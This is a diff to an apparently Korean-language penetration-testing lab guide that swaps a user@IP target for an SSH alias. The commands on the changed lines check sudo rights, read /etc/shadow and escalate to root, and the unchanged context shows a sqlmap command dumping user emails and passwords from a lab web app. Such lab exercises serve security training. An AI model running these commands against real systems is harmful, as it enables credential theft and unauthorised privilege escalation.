@@ -274,10 +274,10 @@ for f in package.json.bak suspicious_errors.yml; do
 done
 
 # sudo NOPASSWD
-ssh ccc@10.20.30.80 "sudo -l | head -5"
+ssh 6v6-web "sudo -l | head -5"
 
 # /etc/shadow
-ssh ccc@10.20.30.80 "sudo cat /etc/shadow | head -3"
+ssh 6v6-web "sudo cat /etc/shadow | head -3"
 ```
 
 ### 공격 실행·권한 상승 (30분)
@@ -293,7 +293,7 @@ sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
   --batch -T Users -C email,password --dump 2>&1 | tail -30
 
 # 수직 권한상승
-ssh ccc@10.20.30.80 "sudo whoami"   # root
+ssh 6v6-web "sudo whoami"   # root
 ```
 
 ### 증거·보고서 (45분)
